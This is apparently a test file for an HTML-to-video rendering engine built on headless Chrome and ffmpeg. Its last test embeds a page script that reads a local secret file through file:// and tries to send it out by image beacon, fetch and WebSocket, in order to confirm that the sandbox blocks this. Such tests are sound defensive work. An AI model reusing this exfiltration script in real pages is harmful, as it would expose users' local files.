import assert from 'node:assert/strict';
import {execFile} from 'node:child_process';
import {mkdir, mkdtemp, readFile, readdir, rm, writeFile} from 'node:fs/promises';
import {createServer} from 'node:http';
import type {AddressInfo} from 'node:net';
import {tmpdir} from 'node:os';
import {join} from 'node:path';
import {setTimeout as sleep} from 'node:timers/promises';
import {describe, it} from 'node:test';
import {
	buildMotionFfmpegArgs,
	cdpRequest,
	frameCount,
	frameFileName,
	motionEngine,
	parseCdpMessage,
} from '../src/engines/motion.ts';
import type {MotionInput} from '../src/engines/motion.ts';
import {chromeArgs} from '../src/engines/chrome-session.ts';
import {execFileExec, isEngineFailure} from '../src/exec.ts';
import type {EngineRunContext} from '../src/types.ts';
import {isChromeAlive, leftoverProfiles, withIsolatedTmp} from './render-helpers.ts';

const availability = await motionEngine.available({
	exec: execFileExec,
	env: process.env,
});
const live = availability.ok ? {} : {skip: 'Chrome or ffmpeg is not installed'};

function contextFor(
	outDir: string,
	overrides: Partial<EngineRunContext> = {},
): EngineRunContext {
	return {
		outDir,
		cwd: outDir,
		signal: AbortSignal.timeout(120_000),
		exec: execFileExec,
		env: process.env,
		fetch: () => Promise.reject(Error('motion must not use the network')),
		...overrides,
	};
}

function inputOf(overrides: Partial<MotionInput>): MotionInput {
	return {
		html: '<p>x</p>',
		width: 320,
		height: 240,
		fps: 10,
		durationS: 1,
		musicVolume: 0.25,
		...overrides,
	};
}

function parseOf(raw: unknown): MotionInput {
	const parsed = motionEngine.parse(raw);
	assert.equal(parsed.ok, true);
	return (parsed as {readonly value: MotionInput}).value;
}

function run(file: string, args: readonly string[]): Promise<string> {
	return new Promise((resolve, reject) => {
		execFile(file, [...args], {maxBuffer: 1 << 26}, (error, stdout, stderr) => {
			if (error !== null) return reject(Error(`${file} failed: ${stderr}`));
			resolve(stdout);
		});
	});
}

async function withTempDir<T>(body: (dir: string) => Promise<T>): Promise<T> {
	const dir = await mkdtemp(join(tmpdir(), 'atelier-motion-'));
	try {
		return await body(dir);
	} finally {
		await rm(dir, {recursive: true, force: true});
	}
}

async function renderOf(
	dir: string,
	overrides: Partial<MotionInput>,
): Promise<string> {
	const outputs = await motionEngine.run({
		input: inputOf(overrides),
		ctx: contextFor(dir),
	});
	assert.equal(outputs.length, 1);
	assert.equal(outputs[0]?.kind, 'video');
	return outputs[0]?.path ?? '';
}

interface Probe {
	readonly streams: readonly {
		readonly codec_type: string;
		readonly width?: number;
		readonly height?: number;
		readonly avg_frame_rate?: string;
	}[];
	readonly format: {readonly duration: string};
}

async function probe(path: string): Promise<Probe> {
	const json = await run('ffprobe', [
		'-v',
		'error',
		'-show_streams',
		'-show_format',
		'-of',
		'json',
		path,
	]);
	return JSON.parse(json) as Probe;
}

async function rawFrame(params: {
	readonly video: string;
	readonly at: number;
	readonly dir: string;
	readonly pixFmt: 'rgb24' | 'gray';
	readonly scale?: string;
}): Promise<Buffer> {
	const out = join(params.dir, `frame-${params.at}-${params.pixFmt}.raw`);
	const filter = params.scale === undefined ? [] : ['-vf', params.scale];
	await run('ffmpeg', [
		'-v',
		'error',
		'-y',
		'-ss',
		String(params.at),
		'-i',
		params.video,
		'-frames:v',
		'1',
		...filter,
		'-f',
		'rawvideo',
		'-pix_fmt',
		params.pixFmt,
		out,
	]);
	return readFile(out);
}

async function averageColor(
	video: string,
	at: number,
	dir: string,
): Promise<{readonly r: number; readonly g: number; readonly b: number}> {
	const bytes = await rawFrame({video, at, dir, pixFmt: 'rgb24', scale: 'scale=1:1'});
	return {r: bytes[0] ?? -1, g: bytes[1] ?? -1, b: bytes[2] ?? -1};
}

// Leftmost bright column of a 320x240 gray frame: where the rAF-driven box currently is.
async function leftEdge(video: string, at: number, dir: string): Promise<number> {
	const bytes = await rawFrame({video, at, dir, pixFmt: 'gray'});
	for (let x = 0; x < 320; x += 1) {
		if ((bytes[120 * 320 + x] ?? 0) > 128) return x;
	}
	return -1;
}

const REDDEN_TO_BLUE = `<style>
html,body{margin:0;width:100%;height:100%}
body{animation:fade 1s linear forwards}
@keyframes fade{from{background:rgb(255,0,0)}to{background:rgb(0,0,255)}}
</style>`;

const RAF_BOX = `<body style="margin:0;background:#000"><div id="b" style="position:absolute;top:100px;left:0;width:40px;height:40px;background:#fff"></div>
<script>
function step(t){document.getElementById('b').style.left=(t/1000*200)+'px';requestAnimationFrame(step)}
requestAnimationFrame(step)
</script></body>`;

const WAAPI_BOX = `<body style="margin:0;background:#000"><div id="b" style="position:absolute;top:100px;left:0;width:40px;height:40px;background:#fff"></div>
<script>
document.getElementById('b').animate([{left:'0px'},{left:'200px'}],{duration:1000,easing:'linear',fill:'forwards'})
</script></body>`;

const TIMER_BOX = `<body style="margin:0;background:#000"><div id="b" style="position:absolute;top:100px;left:0;width:40px;height:40px;background:#fff"></div>
<script>
let x=0;
setInterval(()=>{x+=10;document.getElementById('b').style.left=x+'px'},50)
</script></body>`;

describe('motion parse', () => {
	it('applies every default', () => {
		assert.deepEqual(motionEngine.parse({html: '<p>hi</p>', duration_s: 4}), {
			ok: true,
			value: {
				html: '<p>hi</p>',
				width: 1080,
				height: 1920,
				fps: 30,
				durationS: 4,
				voiceover: undefined,
				music: undefined,
				musicVolume: 0.25,
			},
		});
	});

	it('maps snake_case keys and accepts the bounds', () => {
		assert.deepEqual(
			motionEngine.parse({
				html: '<p>hi</p>',
				width: 160,
				height: 3840,
				fps: 24,
				duration_s: 30,
				voiceover: '/a/voice.mp3',
				music: '/a/music.wav',
				music_volume: 0,
			}),
			{
				ok: true,
				value: {
					html: '<p>hi</p>',
					width: 160,
					height: 3840,
					fps: 24,
					durationS: 30,
					voiceover: '/a/voice.mp3',
					music: '/a/music.wav',
					musicVolume: 0,
				},
			},
		);
	});

	const rejections: readonly (readonly [string, unknown, string])[] = [
		['a non-object', 'nope', 'input must be an object'],
		['missing html', {duration_s: 2}, 'html must be a non-empty string'],
		['blank html', {html: '  ', duration_s: 2}, 'html must be a non-empty string'],
		[
			'oversized html',
			{html: 'x'.repeat(400_001), duration_s: 2},
			'html must be at most 400000 characters',
		],
		['missing duration', {html: '<p/>'}, 'duration_s is required'],
		['short duration', {html: '<p/>', duration_s: 0.4}, 'duration_s must be between 0.5 and 30'],
		['long duration', {html: '<p/>', duration_s: 31}, 'duration_s must be between 0.5 and 30'],
		['odd width', {html: '<p/>', duration_s: 2, width: 1081}, 'width and height must be even numbers'],
		['wide width', {html: '<p/>', duration_s: 2, width: 2162}, 'width must be between 160 and 2160'],
		['tall height', {html: '<p/>', duration_s: 2, height: 3842}, 'height must be between 160 and 3840'],
		['fractional width', {html: '<p/>', duration_s: 2, width: 100.5}, 'width must be an integer'],
		['sixty fps', {html: '<p/>', duration_s: 2, fps: 60}, 'fps must be between 24 and 30'],
		['25 fps', {html: '<p/>', duration_s: 2, fps: 25}, 'fps must be 24 or 30'],
		[
			'relative voiceover',
			{html: '<p/>', duration_s: 2, voiceover: 'v.mp3'},
			'voiceover must be an absolute path',
		],
		[
			'relative music',
			{html: '<p/>', duration_s: 2, music: 'm.mp3'},
			'music must be an absolute path',
		],
		[
			'loud music',
			{html: '<p/>', duration_s: 2, music_volume: 2},
			'music_volume must be between 0 and 1',
		],
	];
	for (const [label, raw, error] of rejections) {
		it(`rejects ${label}`, () => {
			assert.deepEqual(motionEngine.parse(raw), {ok: false, error});
		});
	}
});

describe('motion pure helpers', () => {
	it('counts rounded frames and names them with five digits', () => {
		assert.equal(frameCount(inputOf({durationS: 4, fps: 30})), 120);
		assert.equal(frameCount(inputOf({durationS: 0.55, fps: 24})), 13);
		assert.equal(frameFileName(7), '00007.png');
	});

	it('launches Chrome over a DevTools pipe behind a closed proxy, with no file access', () => {
		const args = chromeArgs({
			profileDir: '/p',
			width: 320,
			height: 240,
			sandboxHost: '127.0.0.1:5555',
		});
		assert.deepEqual(args, [
			'--headless=new',
			'--disable-gpu',
			'--hide-scrollbars',
			'--mute-audio',
			'--no-first-run',
			'--no-default-browser-check',
			'--disable-background-networking',
			'--disable-component-update',
			'--remote-debugging-pipe',
			'--user-data-dir=/p',
			'--window-size=320,240',
			'--proxy-server=127.0.0.1:9',
			'--proxy-bypass-list=<-loopback>;127.0.0.1:5555',
			'--force-webrtc-ip-handling-policy=disable_non_proxied_udp',
			'about:blank',
		]);
		assert.equal(
			args.some(arg => arg.includes('allow-file-access') || arg.includes('remote-debugging-port')),
			false,
		);
	});

	it('encodes frames alone without a filter graph', () => {
		assert.deepEqual(
			buildMotionFfmpegArgs(inputOf({durationS: 4, fps: 30}), {
				outPath: '/o/motion.mp4',
			}),
			[
				'-y',
				'-hide_banner',
				'-nostats',
				'-loglevel',
				'error',
				'-framerate',
				'30',
				'-i',
				'%05d.png',
				'-map',
				'0:v',
				'-c:v',
				'libx264',
				'-preset',
				'medium',
				'-crf',
				'18',
				'-pix_fmt',
				'yuv420p',
				'-movflags',
				'+faststart',
				'-t',
				'4',
				'/o/motion.mp4',
			],
		);
	});

	it('mixes voiceover and music after the frame input', () => {
		const args = buildMotionFfmpegArgs(
			inputOf({durationS: 2, voiceover: '/a/v.wav', music: '/a/m.wav', musicVolume: 0.3}),
			{outPath: '/o/motion.mp4'},
		);
		assert.deepEqual(args.slice(8, 13), ['%05d.png', '-i', '/a/v.wav', '-i', '/a/m.wav']);
		const graph = args[args.indexOf('-filter_complex') + 1] ?? '';
		assert.equal(
			graph,
			[
				'[1:a]aresample=48000,aformat=channel_layouts=stereo,atrim=duration=2,asetpts=PTS-STARTPTS,apad=whole_dur=2[a0]',
				'[2:a]aresample=48000,aformat=channel_layouts=stereo,atrim=duration=2,asetpts=PTS-STARTPTS,apad=whole_dur=2,volume=0.3,afade=t=out:st=0.5:d=1.5[a1]',
				'[a0][a1]amix=inputs=2:normalize=0,loudnorm=I=-16:TP=-1.5:LRA=11,aresample=48000[aout]',
			].join(';'),
		);
		assert.deepEqual(args.slice(args.indexOf('[aout]') - 1), [
			'-map',
			'[aout]',
			'-c:a',
			'aac',
			'-b:a',
			'192k',
			'-c:v',
			'libx264',
			'-preset',
			'medium',
			'-crf',
			'18',
			'-pix_fmt',
			'yuv420p',
			'-movflags',
			'+faststart',
			'-t',
			'2',
			'/o/motion.mp4',
		]);
	});

	it('builds and reads DevTools messages', () => {
		assert.equal(
			cdpRequest(3, 'Page.enable'),
			'{"id":3,"method":"Page.enable","params":{}}',
		);
		assert.deepEqual(parseCdpMessage('{"id":3,"result":{"data":"abc"}}'), {
			kind: 'result',
			id: 3,
			result: {data: 'abc'},
		});
		assert.deepEqual(parseCdpMessage('{"id":4,"error":{"message":"nope"}}'), {
			kind: 'error',
			id: 4,
			message: 'nope',
		});
		assert.deepEqual(
			parseCdpMessage('{"method":"Page.loadEventFired","params":{"timestamp":1}}'),
			{kind: 'event', method: 'Page.loadEventFired', params: {timestamp: 1}},
		);
		assert.equal(parseCdpMessage('not json'), undefined);
	});
});

describe('motion engine', live, () => {
	it('reports a missing voiceover before launching Chrome', async () => {
		await withTempDir(async dir => {
			await assert.rejects(
				motionEngine.run({
					input: inputOf({voiceover: join(dir, 'absent.wav')}),
					ctx: contextFor(dir),
				}),
				error => {
					assert.equal(isEngineFailure(error), true);
					assert.equal((error as {code: string}).code, 'missing_input');
					assert.equal((error as {retryable: boolean}).retryable, false);
					return true;
				},
			);
			assert.deepEqual(await readdir(dir), []);
		});
	});

	it('renders a CSS animation deterministically: red at the start, blue at the end', async () => {
		await withTempDir(async dir => {
			const video = await renderOf(dir, {html: REDDEN_TO_BLUE});
			const info = await probe(video);
			const stream = info.streams.find(s => s.codec_type === 'video');
			assert.equal(stream?.width, 320);
			assert.equal(stream?.height, 240);
			assert.equal(stream?.avg_frame_rate, '10/1');
			assert.ok(Math.abs(Number(info.format.duration) - 1) < 0.12, info.format.duration);
			assert.equal(info.streams.some(s => s.codec_type === 'audio'), false);

			const first = await averageColor(video, 0, dir);
			const middle = await averageColor(video, 0.4, dir);
			const last = await averageColor(video, 0.9, dir);
			assert.ok(first.r > 200 && first.b < 60, JSON.stringify(first));
			assert.ok(last.b > 200 && last.r < 60, JSON.stringify(last));
			assert.ok(
				middle.r > 100 && middle.r < 200 && middle.b > 60 && middle.b < 200,
				JSON.stringify(middle),
			);
			assert.deepEqual((await readdir(dir)).filter(name => !name.endsWith('.raw')).sort(), [
				'motion.mp4',
				'source.html',
			]);
		});
	});

	it('advances a requestAnimationFrame animation on the virtual clock', async () => {
		await withTempDir(async dir => {
			const video = await renderOf(dir, {html: RAF_BOX});
			const first = await leftEdge(video, 0, dir);
			const middle = await leftEdge(video, 0.4, dir);
			const last = await leftEdge(video, 0.9, dir);
			assert.ok(first >= 0 && first < 10, `first ${first}`);
			assert.ok(middle > 60 && middle < 100, `middle ${middle}`);
			assert.ok(last > 150 && last < 190, `last ${last}`);
		});
	});

	it('advances Web Animations API animations on the same clock', async () => {
		await withTempDir(async dir => {
			const video = await renderOf(dir, {html: WAAPI_BOX});
			const first = await leftEdge(video, 0, dir);
			const middle = await leftEdge(video, 0.4, dir);
			const last = await leftEdge(video, 0.9, dir);
			assert.ok(first >= 0 && first < 10, `first ${first}`);
			assert.ok(middle > 70 && middle < 90, `middle ${middle}`);
			assert.ok(last > 170 && last < 190, `last ${last}`);
		});
	});

	it('fires setInterval callbacks by virtual time, not wall time', async () => {
		await withTempDir(async dir => {
			const video = await renderOf(dir, {html: TIMER_BOX});
			assert.equal(await leftEdge(video, 0, dir), 0);
			assert.equal(await leftEdge(video, 0.4, dir), 80);
			assert.equal(await leftEdge(video, 0.9, dir), 180);
		});
	});

	it('mixes a voiceover into exactly one audio stream', async () => {
		await withTempDir(async dir => {
			const voice = join(dir, 'tone.wav');
			await run('ffmpeg', [
				'-v',
				'error',
				'-y',
				'-f',
				'lavfi',
				'-i',
				'sine=frequency=440:duration=1',
				voice,
			]);
			const video = await renderOf(dir, {html: REDDEN_TO_BLUE, voiceover: voice});
			const info = await probe(video);
			assert.equal(info.streams.filter(s => s.codec_type === 'audio').length, 1);
			assert.equal(info.streams.filter(s => s.codec_type === 'video').length, 1);
		});
	});

	it('kills Chrome and its helpers when the run is aborted, and removes its profile', async () => {
		await withIsolatedTmp(async root => {
			await withTempDir(async dir => {
				const controller = new AbortController();
				const running = motionEngine.run({
					input: inputOf({html: REDDEN_TO_BLUE, durationS: 30, fps: 30}),
					ctx: contextFor(dir, {signal: controller.signal}),
				});
				const settled = running.then(
					() => 'finished',
					() => 'rejected',
				);
				let up = false;
				for (let tries = 0; tries < 100 && !up; tries += 1) {
					up = await isChromeAlive(root);
					if (!up) await sleep(100);
				}
				assert.equal(up, true, 'Chrome should be running with its profile under the temp root');
				let framesWritten = 0;
				for (let tries = 0; tries < 200 && framesWritten < 3; tries += 1) {
					framesWritten = (await readdir(join(dir, 'frames')).catch(() => [])).length;
					if (framesWritten < 3) await sleep(50);
				}
				assert.ok(framesWritten >= 3, 'the abort should land mid-render');
				controller.abort();
				assert.equal(await settled, 'rejected');
				assert.equal(await isChromeAlive(root), false);
				assert.deepEqual(await readdir(dir), ['source.html']);
				assert.deepEqual(await leftoverProfiles(root), []);
			});
		});
	});

	it('keeps its Chrome profile out of the job folder', async () => {
		await withIsolatedTmp(async root => {
			await withTempDir(async dir => {
				const controller = new AbortController();
				const running = motionEngine.run({
					input: inputOf({html: REDDEN_TO_BLUE, durationS: 30, fps: 30}),
					ctx: contextFor(dir, {signal: controller.signal}),
				});
				const settled = running.then(
					() => 'finished',
					() => 'rejected',
				);
				let profiles: readonly string[] = [];
				for (let tries = 0; tries < 100 && profiles.length === 0; tries += 1) {
					profiles = await leftoverProfiles(root);
					if (profiles.length === 0) await sleep(50);
				}
				assert.equal(profiles.length, 1);
				assert.deepEqual(
					(await readdir(dir)).filter(name => name.startsWith('.chrome')),
					[],
				);
				controller.abort();
				await settled;
			});
		});
	});

	it('rejects, without crashing or orphaning Chrome, when a frame cannot be written', async () => {
		const unhandled: unknown[] = [];
		const record = (reason: unknown): void => {
			unhandled.push(reason);
		};
		process.on('unhandledRejection', record);
		try {
			await withIsolatedTmp(async root => {
				await withTempDir(async dir => {
					const running = motionEngine.run({
						input: inputOf({html: REDDEN_TO_BLUE, durationS: 30, fps: 30}),
						ctx: contextFor(dir),
					});
					const settled = running.then(
						() => undefined,
						(error: unknown) => error,
					);
					let framesWritten = 0;
					for (let tries = 0; tries < 400 && framesWritten < 2; tries += 1) {
						framesWritten = (await readdir(join(dir, 'frames')).catch(() => [])).length;
						if (framesWritten < 2) await sleep(25);
					}
					assert.ok(framesWritten >= 2, 'frames should be flowing before the folder vanishes');
					await rm(join(dir, 'frames'), {recursive: true, force: true});
					const error = await settled;
					assert.equal(isEngineFailure(error), true);
					assert.equal((error as {code: string}).code, 'render_failed');
					assert.equal((error as {retryable: boolean}).retryable, true);
					await sleep(300);
					assert.equal(await isChromeAlive(root), false);
					assert.deepEqual(await leftoverProfiles(root), []);
				});
			});
		} finally {
			process.off('unhandledRejection', record);
		}
		assert.deepEqual(unhandled, []);
	});

	it('renders when the project path contains percent signs', async () => {
		await withTempDir(async base => {
			const project = join(base, '100% x%05dy %d');
			const outDir = join(project, 'out');
			await mkdir(outDir, {recursive: true});
			const outputs = await motionEngine.run({
				input: inputOf({html: REDDEN_TO_BLUE}),
				ctx: contextFor(outDir, {cwd: project}),
			});
			assert.equal(outputs[0]?.path, join(outDir, 'motion.mp4'));
			const info = await probe(join(outDir, 'motion.mp4'));
			assert.equal(info.streams.find(s => s.codec_type === 'video')?.width, 320);
			assert.ok(Math.abs(Number(info.format.duration) - 1) < 0.12, info.format.duration);
		});
	});

	it('cannot read files or reach the network from the page', async () => {
		await withTempDir(async dir => {
			const secret = join(dir, 'secret.txt');
			await writeFile(secret, 'TOP-SECRET-MOTION');
			const hits: string[] = [];
			const listener = createServer((request, response) => {
				hits.push(decodeURIComponent(request.url ?? ''));
				response.writeHead(200, {'Access-Control-Allow-Origin': '*'});
				response.end('ok');
			});
			await new Promise<void>(resolve => listener.listen(0, '127.0.0.1', resolve));
			const port = (listener.address() as AddressInfo).port;
			const html = `<body style="margin:0;background:#fff"><script>
var x=new XMLHttpRequest();x.open('GET','file://${secret}',false);
try{x.send();new Image().src='http://127.0.0.1:${port}/leak?d='+encodeURIComponent(x.responseText)}catch(e){}
fetch('http://127.0.0.1:${port}/fetch?d=1',{mode:'no-cors'}).catch(function(){});
new Image().src='http://127.0.0.1:${port}/img';
new WebSocket('ws://127.0.0.1:${port}/ws');
</script></body>`;
			const outDir = join(dir, 'job');
			await mkdir(outDir);
			await motionEngine.run({
				input: inputOf({html, durationS: 1.5, fps: 10}),
				ctx: contextFor(outDir),
			});
			await sleep(500);
			listener.close();
			assert.deepEqual(hits, []);
		});
	});
});
